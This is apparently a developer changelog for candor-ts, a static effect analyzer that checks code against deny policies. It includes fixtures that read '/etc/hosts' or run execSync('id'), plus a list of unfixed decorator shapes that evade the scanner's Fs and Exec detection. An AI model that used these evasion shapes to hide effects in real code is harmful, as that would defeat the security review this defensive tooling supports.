  node kinds) and no chained report, past or future, could ever answer one. `unanswerableKey` now returns
  the decl for both, so `discloseUnanswerableKey` fires its existing single disclosure path (`Unknown` +
  a best-effort `callback:`/`dispatch:` reason) instead of dropping the call. Three controls hold: a
  package `--dep-inits` already resolved via a plain named export keeps resolving, byte-identical;
  without `--dep-inits` the report is byte-identical to pre-fix; a package with no external deps at all
  is byte-identical on both paths. Full test battery green (1578 tests, probe, fuzz, self-gate, effect-set
  oracle). The directory-independent `"package"` field mentioned alongside this in the corpus round is
  the existing `path.basename(rootDir)`/`package.json` fallback, not a dep-init identity leak — confirmed
  by reproducing byte-identical `pkgName` behaviour with and without `--dep-inits` in a differently-named
  directory.

- **THE FUNNEL: the `.d.ts`-shadow and `--dep-inits` fixes above share one structure — two
  independently-correct checks each deferring, and the conjunction being silence — and it was the
  STRUCTURE that was unfixed, not just its two instances.** The external-declaration decision (chained
  dep hit → §5.1 manifest → κ-coverage ledger → `unanswerableKey` disclosure) was hand-rolled up to three
  times over: the CallExpression (CLASSIFY) arm, the desugared-declaration arm (`chargeExternalDecl`,
  coercion/HOF-ref sites), and the tagged-template arm. The first two had already drifted into needing
  the two fixes above; the third had NEVER grown the chained-dep-hit or `unanswerableKey` halves at all.
  Extracted the shared tail (manifest → ledger → disclosure) into one function, `disclosureTail`, that
  `chargeExternalDecl` and the CLASSIFY arm now both call — a pure refactor, proved byte-identical
  (`cmp`/sha256) across all 26 corpus targets (113 installed `node_modules` packages via 12 real import
  graphs + all 14 published tarballs) and against the `.d.ts`-shadow and `--dep-inits` regression
  fixtures, which stay fixed. Routed the tagged-template arm and one more newly-found instance — a
  reflective `depFn.call(this, x)`/`.apply(...)` onto an uncurated dependency's exported function, which
  was previously neither edged, κ-classified, nor disclosed — through the same funnel: MEASURED with two
  constructed fixtures (a dependency's opaque `.call()` invoke; a tagged SQL-style call resolving onto a
  chained-but-abstract dependency export) that each silently vanished from `functions` before this change
  and now disclose `invisible`/`Unknown` correctly. Neither shape occurs in the corpus above (both fixes
  are additive with zero corpus-visible effect there). ATTEMPTED AND REVERTED: a further generalization
  treating `crossesPackageBoundary`'s "no package.json found at all" reading as boundary-crossing (closing
  the same hole one level further out) fabricated a blind disclosure on this engine's own pinned CONTROL
  test — a single-file scan target's local sibling import has no package.json either, and is
  indistinguishable from a genuinely unowned file by this signal alone; left as a filed, un-closed
  finding rather than shipped. Full test battery green (1589 tests, mcp/lsp/watch, probe, fuzz,
  transitive-recall, self-gate, effect-set oracle).

- **`outOfScope`/`scannedUnder` were OMITTED, not `[]`, over a policy-scanned tree with no exclusions —
  collapsing "asked and clear" into "never asked".** MEASURED four-way: candor-java and candor-rust both
  emit `outOfScope: []` and `scannedUnder: {deny: […]}` whenever a policy is configured and honoured,
  independent of whether anything was excluded; candor-ts emitted neither key unless `excludedFiles.length`
  was non-zero, so a clean tree under `deny Exec` produced the SAME document a no-policy scan does — a
  false "nobody asked" over code that really was asked and answered clear. It failed CLOSED (an absent
  `scannedUnder` reads as the empty deny set, and no report has a `peeked: true` class to trigger the
  ⟨0.32⟩/⟨0.33⟩ rules), so no verdict certified wrongly, but it was still a false statement about what was
  asked — the ⟨0.26⟩ partial-manifest collapse this format exists to prevent. `scan.mjs`'s peek trigger no
  longer requires `excludedFiles.length`; only the subprocess spawn (nothing to gain from peeking an empty
  set) stays conditioned on it. No policy, or a policy the engine refuses, still leaves both keys ABSENT; a
  tree WITH exclusions is byte-identical to before (`cmp`-verified).

- **`candor_whatif` (MCP) and `candor.whatif` (LSP) had ZERO tests for the `ok`-withdrawal `ae70ce4`
  shipped.** That commit fixed `ok`-withdrawal on all three `whatif` surfaces (CLI, MCP, LSP) for the
  ⟨0.30⟩ `outOfScope`, ⟨0.32⟩ unread-class and ⟨0.33⟩ cross-policy causes in one change and added no
  coverage — conformance PART 70 pins the CLI only, and before this the CLI had accumulated all four
  incompleteness causes across four rungs while MCP and LSP carried none of them, not even the original
  ⟨0.21⟩ `unanalyzed` one. `test-mcp.mjs` and `test-lsp.mjs` now each pin all three later causes (plus
  both over-charge controls, both polarities) on a synthetic load/top report fixture reproducing PART
  70's own shape as raw report mutations — `reportCompleteness`/`mustHedge` (query-core.mjs) read the
  report's own `excluded`/`outOfScope`/`scannedUnder` keys, so a handwritten report exercises the same
  consumer path a real peek's output would. The LSP block is new territory, not a duplicate of the
  existing ⟨0.32⟩ LSP block: that one drives `textDocument/didOpen` and reads `diagnosticsFor`'s
  disclosure; nothing before this drove `workspace/executeCommand candor.whatif` and read its RESULT
  document for `ok`/`incomplete`. Falsified against `ae70ce4`'s parent commit on both files (RED on all
  three cause cells, controls unaffected) and restored (GREEN).

- **⚠ closes the follow-on this section's `.d.ts`-shadow entry filed open: a package whose own `name`
  collides with a whole-module κ rule had its OWN internal calls charged that rule's effect, for every
  call shape the shadow-redirect didn't reach.** `declModule` walks up to the nearest `package.json`
  when a declaration's file isn't in `projectFiles` and isn't under `node_modules/` — exactly a
  package's own `dist/*.js` + `dist/*.d.ts` — and that walk resolves to the SCANNED package's own name.
  A whole-module κ rule with a `null` member-regex (`got`, `pg`, `fs-extra`, `execa`, `dotenv`,
  `winston`, `bcrypt`, … one per §1 effect) then matches unconditionally. MEASURED, byte-identical
  source with only `package.json`'s `name` changed: `super(x)` into a same-package base class,
  `new ns.Ctor()`, `obj.method()`, and a bare call whose `.js` sibling isn't in `projectFiles` all read
  `Net`/`Db`/… under the colliding name and pure under a non-colliding one (`mypkg`); `gaxios` (a
  verb-scoped rule, no `null` member) never fired, isolating the mechanism to the null-member shape.
  ROOT CAUSE: a package is treated as an external dependency of itself. FIX attacks the root rather
  than the four shapes: `isOwnPackageDecl(decl)` asks whether the declaring file is OUR OWN package —
  `nearestPackageName` on the file, excluding anything under `node_modules/` outright so a genuine
  INSTALLED dependency of the same name is never suppressed — and gates every κ lookup on it (the
  (CLASSIFY) arm, the `new`-with-inherited-ctor re-key, the reflective `.call`/`.apply` arm, and the
  external tagged-template arm). `mod` is left exactly as `declModule` computed it; the existing
  `crossesPackageBoundary`-keyed κ-ledger already treats the file as ours, so refusing κ an answer is
  sufficient — no new disclosure, no rewritten module string. KEPT the ⟨0.33.0⟩ `.d.ts`-shadow redirect
  unchanged: it recovers a REAL resolved effect for the bare-identifier-with-sibling shape (the two solve
  different problems, fabrication vs. resolution), and this guard runs strictly after it, only where it
  declined or failed. CONTROLS: a genuine `node_modules` dependency (`got`/`glob`/`execa`) is unmoved,
  including the pathological case of a package literally NAMED `got` that also depends on the real
  npm `got` (the dependency call still reads `Net`, the self-collision call no longer does); `mypkg`
  stays pure; the ⟨0.33.0⟩ `.d.ts`-shadow gains (104 functions, e.g. date-fns's `Clock`, rimraf's
  `Rand`) are byte-identical on the 120-package corpus that measured them, except `got`/`ioredis`
  themselves — both real published packages whose own name collides with the Net/Db rule — which lose
  exactly the fabricated charge (a `Db`/`Net` tag) on every affected function while every other
  disclosure (`Unknown`, `Rand`, real `Net` from an actual socket call) is untouched.

- **R57: an ANONYMOUS decorator expression minted no unit at all, so a real effect in its body vanished
  with ZERO disclosure.** `@((_t, _k, _d) => { fs.readFileSync("/etc/hosts"); }) class Thing {}` —
  `deny Fs` read `policy ✓` at exit 0, `functions: []`. `enclosing()`'s Decorator-ancestor guard (added to
  keep a NAMED factory's own effects off the decorated declaration — `@Entity("users")`'s `Entity` is a
  FunctionDeclaration, minted and reported on ITS OWN, independent of this climb) stops the climb dead the
  moment it reaches ANY Decorator, with no distinction for the one case that has no other unit to fall
  back on: an anonymous function used directly AS the decorator. FIXED by minting a unit for exactly that
  shape in `localName` — before the climb ever reaches the Decorator guard, not by changing the guard —
  keyed by source position (`<decorator>@<offset>`, mirroring the `defineProperty` computed-key units)
  since two anonymous decorators in one file must not clobber each other's record. Two spellings covered,
  both measured against this repo's own `typescript` AST through however many `ParenthesizedExpression`
  wrappers surround them: the direct form (`@((_t,_k,_d) => {…})` — an arrow decorator MUST be
  parenthesized, `@x => y` does not parse as intended) and an immediately-invoked anonymous FACTORY
  (`@(function(_t,_k,_d){…})(arg)`, the callee position). A factory that RETURNS a nested anonymous
  closure (`@(() => (_t,_k,_d) => {…})()`) is deliberately NOT special-cased — the existing "closures fold
  to the nearest enclosing named unit" rule already lands it on the newly-minted factory unit and reports
  it there (verified; an attribution imprecision, not a vanish). MEASURED red→green: the fixture above now
  reports `<decorator>@29` with `Fs`, `deny Fs` exits 1. OVER-CHARGE CONTROL (must stay unmoved — this
  behaviour is deliberate and tested, `test.mjs` lines ~2611 and ~5102-5126): a NAMED factory
  (`@Entity("users")`, `Entity` declared locally with a body performing `Fs`) is BYTE-IDENTICAL before and
  after (`Entity`'s own unit still carries the charge; no `<decorator>` unit is minted for it; `<module>`
  still gains nothing from the decorator application, per the existing "load-time, factory owns it" test).
  Full suite green: lint, 126 unit tests, 1604 behavioral (`node test.mjs --parallel`, 8 new, pinned with
  their controls), 174 MCP, 101 LSP, 16 watch, fabrication probe (37 functions / 10 builtins), fuzz (25
  seeds), and the sensitivity battery (8/8) — all unaffected outside the 8 new checks. Quantified across the SAME
  corpora as the fix above it — 113 installed `node_modules` packages (`corpus1-ts`) and 14 published npm
  tarballs (`corpus2-ts`): every `functions[]` byte-identical (0 diffs; SHA-256-verified on corpus1's
  whole-tree scan). Caveat, stated plainly: neither corpus contains any real TypeScript decorator syntax
  (grepped — the corpus2 hits on `^\s*@\w` are all JSDoc `@default`/`@example` lines), so this is a clean
  NEGATIVE control (no regression to the general classifier) rather than evidence the fix fires on real
  code; the positive proof is the hand-built fixture plus method/parameter/multi-decorator variants (all
  verified, including that two anonymous decorators in one file mint two distinct, non-colliding units).
  **RESIDUAL, MEASURED AND NOT FIXED (rule 9 widening):** the SAME Decorator-ancestor guard also silently
  drops (a) a raw effect evaluated directly as a decorator/factory ARGUMENT
  (`@Named(fs.readFileSync(...).toString())`), (b) an anonymous closure or object-literal method nested
  inside a decorator's argument data (`@Named({ init(){ fs.readFileSync(...) } })`,
  `@Named(() => { fs.readFileSync(...) })`), and (c) a call through an EXTERNAL, uncovered-or-bodyless
  decorator reference (`@extFn("arg")` where `extFn` is `.d.ts`-only or from a package the classifier does
  not cover) — none of these have any OTHER unit to hang the disclosure on, so they read exactly like R57
  did: `policy ✓`, `functions: []`, confirmed by direct reproduction of each. NOT fixed here: every general
  (non-decorator) anonymous-callable shape checked for the same rule-9 inventory — anonymous class
  expressions, an IIFE in a property initializer, an anonymous callback to an unresolved function, a plain
  object-literal method, a getter/setter — already folds up to an enclosing named unit with an honest
  `Unknown` disclosure (never silent), so the vanish is SPECIFIC to the Decorator guard, not a general gap
  in closure attribution. A blanket fix (attribute anything the guard would otherwise drop to a synthetic
  per-decorator or `<module>` unit) was evaluated and rejected: `@Injectable()`/`@Entity()`/`@Get()`-style
  decorators from external packages are `.d.ts`-only from this scan's perspective in essentially all real
  framework code, so treating "bodyless external reference" as disclosure-worthy would mint a new report
  entry (or Unknown) for nearly every decorated declaration in any Angular/NestJS/TypeORM-shaped corpus —
  a corpus byte-identity break far worse than the gap it would close, for a shape this measurement never
  found actual `Fs`/`Exec`/`Net` payloads behind. Filed rather than forced, same as the family's
  `net-partner` disclosure attempt.

## [0.33.0] — 2026-08-26
- **The ⟨0.33⟩ absent-`scannedUnder` refusal is now pinned — nothing watched it before.** A report
  carrying a `peeked: true` class and NO `scannedUnder` key is the shape every pre-0.33 report has,
  so it is this rung's most-exercised path in the wild. The behaviour was already correct; the gap
  was that no test asserted it, and conformance PART 69 cannot — its corruption shapes all carry the
  key, and its skip probe reads an absent one as "this engine has not ported the rung". A regression
  would have been a silent fail-open. Falsified against a mutant before being trusted.

- **MIGRATION — ⟨0.33⟩ IS NOT ADDITIVE, and the cost is measured, not estimated.** If you gate a
  **STORED** report that a pre-0.33 engine produced — committed to a repo, cached between CI jobs, or
  published by a dependency and gated downstream — expect exit 2. Measured over **32 real third-party
  projects, 67 reports, 402 report×policy pairs, all four engines**, published **0.32.1** binaries as
  the producer against **0.33** HEAD as the consumer: **202 of the 265 pairs that pass today — 76.2% —
  flip to exit 2** with the policy unchanged. It is deterministic rather than statistical: a report
  carrying any `peeked: true` class refuses **202 of 202**, a report carrying none passes **63 of 63**,
  and **26 of the 32 projects** have at least one.

  **THE REMEDY: re-scan with a 0.33 engine under the SAME policy the gate applies** — not merely *a*
  policy, which is the loose reading this rung exists to close. It discharges the cost in full:
  **265 of 265** pairs green again, no residual tax and nothing to suppress. A pipeline that scans and
  gates in ONE run under ONE policy is **unaffected** — producer and consumer are the same run, so
  `P ⊆ P` holds by construction. Nor is legitimate narrowing over-charged: **62 pairs** whose
  producer's deny set genuinely covers the gate's took **0 refusals**, and over the full cross-policy
  sweep of **918 gates**, **529 refuse correctly and none fails open**.

  **The operators this hits are the ones who followed ⟨0.32⟩'s own remedy** — *scan with the policy* —
  because that is exactly what puts a `peeked: true` class into a report. They migrated one rung ago
  and are being asked to migrate again, for a hole that remedy did not close. The wording was the
  defect and the wording is the fix. It fails **CLOSED**.

- **⚠ `scannedUnder` — a peek answers only the question it was put (SPEC §2 ⟨0.33⟩).** `excluded[].peeked:
  true` was only ever true RELATIVE to the deny set the PRODUCER held (⟨0.29⟩ bounds the peek to effects
  policy DENIES), and the report never recorded what that set was — so `gate --report`/`candor_gate`/
  `fix-gate --strict`/`unverified --strict` gating a report with a DIFFERENT deny set got a definite
  answer to a question nobody asked. MEASURED on this engine at 0.32.1, a tree whose excluded `dist/`
  module runs `execSync("id")`: `candor-ts <tree> --policy 'deny Net' --out A` writes `peeked: true`
  beside `outOfScope: []` at exit 0; `--policy 'deny Exec'` over the same tree exits 2; `candor-ts-query
  gate --report A --policy 'deny Exec'` answered exit 0, no violations — the hole.
  PRODUCER: `scan.mjs` now records `scannedUnder: { deny: [<expanded rule>, …] }` beside `outOfScope`,
  under the identical emission rule (present iff a policy was configured and honoured), rendered through
  the SAME `ruleUpgrade` spelling already quoted back to an operator for the provable-purity upgrade, so
  the two cannot drift into two spellings of one rule.
  CONSUMER: `gate --report` (`loadGateReport`, read STRICTLY) and the advisory verbs (`reportCompleteness`
  → `reportUnaskedRules`, read leniently and fail-closed) refuse — `ok:false, incomplete:true`, exit 2 —
  when a peeked, non-`judgedElsewhere` class's report does not cover this run's own expanded deny rules,
  naming the unasked rules and pointing at THE SAME policy. An ABSENT `scannedUnder` is the EMPTY SET for
  this test, so a pre-⟨0.33⟩ report carrying `peeked: true` fails closed. Ported to the MCP `candor_gate`/
  `candor_unverified` tools and the LSP diagnostics server (`integrations/vscode` and the JetBrains
  plugin's shipped editor experience) — the same five routes ⟨0.30⟩/⟨0.32⟩ reached, off the identical
  reader in each case, so this cause cannot land at one and not its siblings a fourth time. `fix`/
  `whatif` are unchanged, matching their existing ⟨0.30⟩/⟨0.32⟩ exclusion (they do not answer `ok` over
  these two causes either — a pre-existing gap, not part of this rung).
  Four over-charge controls hold: the SAME policy scan-then-gate pipeline, a consumer's rules a strict
  SUBSET of the producer's, no peeked exclusions at all, and `pure` (an empty-effect-list deny rule)
  correctly refusing rather than comparing equal to an empty set. Conformance PART 69.

- **⟨0.24⟩ `whatif` answered `ok` where the gate refuses over the identical bytes — three causes, three
  surfaces (conformance PART 70).** `advisoryAnswer` has carried the ⟨0.30⟩ `outOfScope`, ⟨0.32⟩
  unread-class and ⟨0.33⟩ cross-policy parameters since the `fix-gate`/`unverified` rungs; the CLI's
  `whatif` call site never passed them, and neither the MCP `candor_whatif` tool nor the LSP
  `candor.whatif` editor command applied `advisoryAnswer` at all — the LSP command returned the raw core
  result unconditionally. So the ⟨0.24⟩ pessimism relation, which says an advisory verb may not be less
  pessimistic than the gate, was broken on this verb for three consecutive rungs, and the LSP is the
  third surface in a row this family's rungs have reached last. All three now read the same
  `reportCompleteness`/`advisoryAnswer` machinery, with `unread` gated on the caller's own `deny`/`pure`
  rules (`whatif`'s policy is OPTIONAL, unlike `fix-gate`'s and `unverified`'s, so a bare `whatif`
  passes `[]` — the structural carve-out `reportUnaskedRules` already takes for every no-policy caller).
  The EXIT is untouched: this verb has no `--strict`, §3.2 rules no exit for it, and inventing one is
  the failure the clause beside it exists to prevent. Byte-identical on a complete report and on the
  pre-existing `unanalyzed` cause, diffed against `9790ce3`'s `query.mjs`/`mcp.mjs`/`lsp.mjs`.

- **`diff` carried NO completeness reader at all, on the CLI *and* the MCP `candor_diff` tool.** It sat
  one case above `containment`'s `putAnswer(...)` and one below `gains`' prefixed spread, both fixed at
  ⟨0.28⟩/⟨0.32⟩ — the sibling verbs were touched and `diff` was not. MEASURED at HEAD 2026-08-26: a
  CURRENT report naming one `excluded[].peeked: false` class, diffed against a baseline, answered
  `{"changes":[…3 real gains…]}` at exit 1 with no caveat on the JSON channel, the human channel, or the
  MCP tool.
  `diff` rests on the SAME two reports `gains` does and fails the same two ways — an incomplete CURRENT
  means a real gained/lost effect can be MISSING from `changes` (the false all-clear this verb's own
  gained-effect exit exists to catch), an incomplete BASELINE means a change that was always there can
  read as newly appeared — so the fix reuses `gainsCompletenessFields`/`gainsCompleteness` VERBATIM
  (`incomplete`/`unanalyzed`/`judgedNothing`/`noManifest` for the CURRENT side, the same keys prefixed
  `baseline*` for the other) rather than mint a fourth spelling for a fourth shape. The prose arm
  withdraws "no effect changes vs the baseline ✓" under a hedge, the same way `gains` withdraws its own
  reassurance; the exit is untouched (a disclosure, not a verdict). `⟨0.33⟩`'s unasked-rules cause cannot
  fire here — `diff` takes no `--policy`, so its `reportCompleteness` call carries the default empty
  deny set, structurally a no-op. The LSP has no `diff`-shaped surface to carry the fix to. Byte-identical
  on an intact pair, on every channel.

- **The README/AGENTS/package.json spec-claim gate reads two spellings it could not see.** The claim
  grammar widened from `spec` + one to FOUR of `[-: "]` to one to EIGHT of `[-: "*)\]]`, which is what
  it takes to reach a version behind an ALIGNED envelope column (`"spec":    "0.32"`) or a markdown link
  (`[candor-spec](…) 0.32`). Both spellings were live in shipped documents in this family while every
  gate read clean over them. The floor is still read off `scan.mjs`, and the negative control now
  carries both new spellings, so a silent revert to the narrow form fails the control instead of
  quietly checking less.

- **The two `MEASURED at spec 0.32` notes carry the `, informative)` marker.** Both record a measurement
  taken at a floor that is now past — the census/skip-list divergence in `scan.mjs`, and the class read
  off the `new` expression rather than the resolved constructor. They are true statements about the past,
  and from 0.33 onward `release-preflight` [2] read them as a bump that missed two shipped-source
  literals. The family's marker for a deliberate historical note is `(spec X.Y, informative)`, the same
  one SPEC.md uses on its replaced-source-file example; applied to both, and to `test.mjs`'s copy of the
  first note so two spellings of one sentence cannot drift apart. Comment-only — no assertion, no fixture
  and no emitted value moves.

## [0.32.1] — 2026-08-25

- Build version → 0.32.1 (`package.json`); no analyzer change.

- **Family build bump — this engine is unchanged.** Floor stays 0.32; the CLI, the MCP tools and the LSP
  server answer exactly as they did at 0.32.0, so nothing here is ⚠ and no report bytes move. The patch
  belongs to candor-java, whose v0.32.0 native binaries were withheld by `native.yml`'s parity gate after
  the image answered `0 functions` over a tree the jar found 210 in. Reaching the rebuilt ones means
  moving `ENGINE_PIN`, which is one value for the entire family — `npx candor-ts@$ENGINE_PIN` included —
  so this package is republished at 0.32.1 to keep that resolvable. `scan.mjs`, `query.mjs`, `policy.mjs`
  and `lsp.mjs` are untouched, and the two IDE clients' `candorTsVersion` pins move with it.

## [0.32.0] — 2026-08-25

- **`callers`, `impact` and `path` carried NO completeness reader at all, on the CLI *and* on the AGENT
  channel — the SILENT half of the same class.** ⟨0.28⟩ widened SPEC §2's re-disclosure MUST to *"any
  verb whose output could be read as a NEGATIVE FINDING about the code — a verdict, an empty result set,
  or a zero count"*, enumerated six verbs, and skipped these three; the ⟨0.32⟩ unread-class cause then
  made the gap fire on nearly every no-policy report. MEASURED at HEAD over a report whose `excluded`
  names one class with `peeked: false` — what a single-file scan with unparsed `.js`/`.mjs` siblings
  publishes, and what a rust crate with one `tests/` dir publishes:

  ```
  callers a.wrapper --json  {"of":[…],"direct":["a.top"],"transitive":["a.top"]}  exit 0  no caveat
  impact  a.wrapper --json  {"fn":…,"affectedCount":1,"affected":["a.top"],…}     exit 0  no caveat
  path    a.top Fs  --json  {"effect":"Fs","fn":…,"path":[…3 steps…]}             exit 0  no caveat
  ```

  **AND THE SAME THREE TOOLS ANSWERED FLAT ON MCP.** Driven over this server's own stdio JSON-RPC
  transport, `candor_callers`, `candor_impact` and `candor_path` returned their answers with no hedge —
  the edit-time channel, where a consumer reading `affectedCount === 0` records "safe to change" and has
  no follow-up question available to it. The `withCompleteness` header claimed
  `candor_show`/`candor_impact` "already fail closed here on the fn-existence guard"; that was true of
  ONE cause and hid three tools, because the guard fires on a missing NAME and says nothing about a
  report that contains the name and declares part of the tree unread.

  Where `show`/`map` OVER-hedged (the caveat replaced the data, ruled the other way in the entry below),
  these three UNDER-hedged. **The remedy is the existing mechanism, not a fourth spelling:** all three
  documents have a FIXED key set at their root, so nothing nests and no reserved-key collision can arise
  — they take `putAnswer` on the CLI and `withCompleteness` on MCP, exactly as `where` does. Both of
  `callers`' answering arms are covered (including the `{}` effect-only fallback, the strongest
  determined negative the format has) and both of `path`'s, and the prose renderers withdraw their
  determined negatives under a hedge — *"nothing calls it"*, *"safe to change"*, *"does not perform"* —
  because leaving the calm sentence standing under the note MOVES the false all-clear rather than
  removing it.

  **The boundary does not move.** `gate`, and `unverified`/`fix-gate`/`whatif`/`fix` under `--strict`,
  answer `ok` and still REFUSE over these same bytes (⟨0.24⟩; conformance PARTs 62 and 67). Healthy
  output is byte-identical, diffed against the pre-change build on both channels.

- **`show` and `map` returned the WARNING INSTEAD OF THE ANSWER — the ⟨0.32⟩ descriptive hedge, ruled
  the other way and closed four-way.** ⟨0.28⟩ Rung A tells a verb *whose pinned shape cannot carry the
  caveat* to emit the CAVEAT DOCUMENT **instead of** its result document, and yesterday's rung armed
  that substitution on the unread-exclusion-class cause. MEASURED on a two-function crate with one
  `tests/` dir (`excluded: [{class: "non-library-target", peeked: false}]`), and reproduced in every
  engine that ships these verbs:

  ```
  show <fn> --json   ->  {"incomplete": true}      exit 0    the rows are GONE
  map       --json   ->  {"incomplete": true}      exit 0    the map is GONE
  ```

  That is approximately every no-policy scan of a crate with `tests/`, `benches/`, `examples/` or a
  `build.rs`, and of a single-file TS scan with unparsed siblings — and through candor-ts's MCP tools
  `candor_show`/`candor_map` handed the same document to an AGENT, on the edit-time channel that cannot
  ask a follow-up question.

  **RETURN THE DATA AND THE WARNING; DO NOT REPLACE THE DATA WITH THE WARNING.** Rung A's wording was
  written when the trigger was a manifest a scan had FAILED to produce — there was little result to
  lose. It is wrong once the trigger is ordinary: `show` and `map` are DESCRIPTIVE, they certify
  nothing, so there is no claim for a pessimism rule to protect and withholding the answer buys no
  soundness. The same codebase already answers this way one verb over — `gains --json` keeps its gained
  set and adds `incomplete: true` beside it — and the descriptive verbs are now consistent with it.

  **THE BOUNDARY IS WHETHER THE VERB ANSWERS `ok`, AND IT IS NOW STATED IN A COMMENT IN ALL FOUR
  ENGINES.** `gate`/`gate --report`, and `unverified`/`fix-gate`/`whatif`/`fix` under `--strict`, answer
  `ok`: they still REFUSE over these same bytes (exit 2, `ok` false on the gate and OMITTED on the
  advisory siblings), which ⟨0.24⟩ requires and conformance PARTs 62 and 67 pin. Getting the boundary
  wrong in that direction re-opens the cardinal sin, so the controls for it were written FIRST and
  confirmed green before anything moved.

  **THE SHAPE: THE RESULT NESTS, THE CAVEAT SITS AT THE ROOT.** `show` hedging is
  `{"functions": [ … ], "incomplete": true, …}`; `map` hedging is `{"modules": { … }, "incomplete":
  true, …}`. Every property Rung A cited for its own shape still holds — healthy output is untouched,
  the root type change stays LOUD (a consumer doing `for (const x of doc)` over `show` still gets a
  TypeError, not a silent zero-iteration loop), and no reserved-key convention is needed. Nesting
  `map`'s USER NAMESPACE one level down *removes* the collision the ruling deferred rather than
  re-opening it: a module literally named `incomplete` is a key of `modules`, the boolean is a key of
  the root, and neither can displace the other. Relative to the shape it replaces the change is purely
  ADDITIVE: a consumer that already handles today's hedge sees one more key.

  **CONTROLS, WRITTEN FIRST AND BOTH DIRECTIONS ASSERTED**, because the safe-looking empty value passes
  a presence check while deleting the feature: the certifying verbs still refuse over an unread class
  (exit 2, `ok` withheld); a report with nothing unread produces a document BYTE-IDENTICAL to the
  pre-change binary's on both verbs, measured by diff; the hedge still appears when it should; and the
  restored answer is asserted by ROW COUNT and NAME, not by key presence.

  **THE MCP HALF IS THE REASON THIS MATTERS MOST**, and it is fixed in the same change:
  `candor_show`/`candor_map` (mcp.mjs) take the same nesting, measured over the server's own stdio
  transport. The one case where the caveat still stands ALONE is `candor_show` for a name the report
  does not contain: `Q.show`'s guard REFUSES the query, so there is no result to return — which is
  not the same thing as one being withheld.

  GATES: npm test (1535 + 152 MCP + 96 LSP + 16 watch + probe + fuzz, 0 failed); ci/self-gate.sh OK.
  Conformance was NOT run — candor-spec is under concurrent edit.

- ⚠ **A verdict row could not say WHICH unit it was about — the ⟨0.32⟩ identity clause, closed.**
  SPEC §2: *"a verdict row MUST carry enough identity for a consumer to tell two units apart… the sort
  key MUST include that identity."* MEASURED, `gate --report` over two reports whose members both define
  `go` and both violate `deny Exec` — two BYTE-IDENTICAL rows:

  ```
  { "rule": "AS-EFF-006", "fn": "go", "effects": ["Exec"], "detail": "`go` performs { Exec } …" },
  { "rule": "AS-EFF-006", "fn": "go", "effects": ["Exec"], "detail": "`go` performs { Exec } …" }
  ```

  A reader cannot tell two broken members from one listed twice, and a consumer that fingerprints on
  name alone — candor's own SARIF action did — hides one finding behind the other.

  **`hash` BESIDE `fn`, never instead of it.** §2.2 already binds a consumer to join a verdict row back
  to its report entry BY HASH, so a row that omits it forces exactly the name join that clause forbids;
  and the NAME is what a policy scope matches, so substituting the qualified form would silently stop
  every scoped rule matching — a false green introduced by fixing a false green. **In this engine the
  identity is the PAIR**, and that is not a weaker port: a `hash` here is `<package>#<local tail>` and is
  measurably not unique (13 shared by ≥2 distinct `fn`s in hono alone), which is why `reportUnits` keys
  by `hash` REFINED BY `fn`. A row carries the module-qualified `fn` and the package-qualified `hash`,
  and the pair is what tells two units apart.

  **AND `forbid`'S VIOLATOR IS TYPICALLY PURE**, which is where the first cut of this got it wrong. A
  function that merely CALLS across a layer performs nothing, so it has NO REPORT ENTRY — and an
  identity derived from the entry list cannot see it. MEASURED: the AS-EFF-009 row for exactly that
  shape came out with no `hash` here while candor-rust, candor-java and candor-swift all emitted one,
  because they build it from the scan's own name table. `scan.mjs` now passes `unitHash` over `fns`,
  which holds every function including the pure ones; the entry-list fallback stays for the callers with
  no such table (MCP, LSP, the unit tests).

  **AND THE SORT KEY IS HALF THE CLAUSE.** `(rule, detail)` ties on the twins — `detail` is rendered
  from the NAME — and §3.3.1 makes the document's ORDER part of the byte-equality between
  `scan --policy` and `gate --report`. This engine had **no sort at all** on either route: order was
  `functions`-array order crossed with policy-rule order, which agrees between the routes only for as
  long as the report is written in the order the scan discovered. `sortViolations` is one definition,
  called from both assembly sites, keyed `(rule, detail, hash)` and compared with `<`/`>` (⟨0.24⟩
  §3.3.1: locale-INDEPENDENT).

  **NOT ADDITIVE, stated plainly:** a new key on the violation record means a verdict document is no
  longer byte-identical to a pre-⟨0.32⟩ one. Unavoidable — the MUST is that the row carry identity, and
  no arrangement of the four existing keys does. Everything that can be additive is: every pre-existing
  key keeps its name, position and value, and `hash` is OMITTED when the producer has none to give (a
  hand-authored report, which §3.1 says this route serves) — ⟨0.26⟩'s *cannot answer*, never a
  fabricated id. Route byte-equality re-measured on a real scan-then-gate pipeline: identical.
  Conformance PART 68 pins it four-way; its `rev` control re-lays the same two reports under swapped
  file stems, so an engine ordering by the discovery walk fails where one ordering by identity passes.

- **`tour` said "nothing hidden" over a class the scan never opened — the ⟨0.32⟩ descriptive hedge,
  ruled and closed four-way.** Over a report whose `excluded` names a class with `peeked: false`, this
  engine, candor-rust and candor-swift printed *"candor: nothing hidden — every effect sits where its
  name says it should"* at exit 0, while candor-java hedged and named the class. **candor-java was
  right, and the ruling is now in a comment in all four engines so it is not re-litigated.**

  **IT IS A DISCLOSURE, NOT A VERDICT** — `tour` answers no `ok` and has no exit-code obligation, so
  ⟨0.24⟩'s advisory-verb pessimism MUST does not reach it and the exit code is unchanged. What reaches
  it is §2 ⟨0.28⟩ (*"any verb whose output could be read as a negative finding about the code — a
  verdict, an empty result set, or a zero count"*) and §3.1 ⟨0.18⟩, which already forbids **that exact
  sentence** over a ≥⅓-Unknown graph. An unread exclusion class is the same ignorance by another route,
  and the ⅓ threshold structurally cannot see it: an unread unit contributes no entry, so it moves
  neither the numerator nor the denominator.

  **THE ARGUMENT THIS FILE USED TO CARRY WAS THE WRONG WAY ROUND**: *"the verbs `mustHedge` serves carry
  no policy, so there is nothing to condition it on."* The condition ⟨0.32⟩ states is the QUESTION IN
  FORCE, and a verb with no policy is not asking a NARROWER question than `deny Exec` — it is asking the
  widest one there is. The two verbs that DO carry a policy still read `unread` directly for their exit
  code, so `fix-gate`/`unverified --strict` are untouched.

  Two disclosure defects fell out of wiring it: the note's head clause was built from the three MANIFEST
  rows alone, so a report whose ONLY cause was `outOfScope` or an unread class produced
  `⚠ INCOMPLETE — the report(s) under this locator ,` — a hedge that names nothing, which is the deleted
  disclosure arriving inside the disclosure (candor-rust and candor-java each measured the same line on
  the same rung); and the tail sentence would have claimed `gate --report` exits 2 with no policy in
  force to say it under. Both causes now have a sentence, and the unread cause has its own tail.

- **⟨0.32⟩ …and there were FIVE routes, not four: the EDITOR showed a clean file over code nothing had
  read.** The entry below is titled *four routes, one rule*. `lsp.mjs` had zero occurrences of
  `excluded`, `peeked` or `unread`, and it is the server `integrations/vscode` and the JetBrains plugin
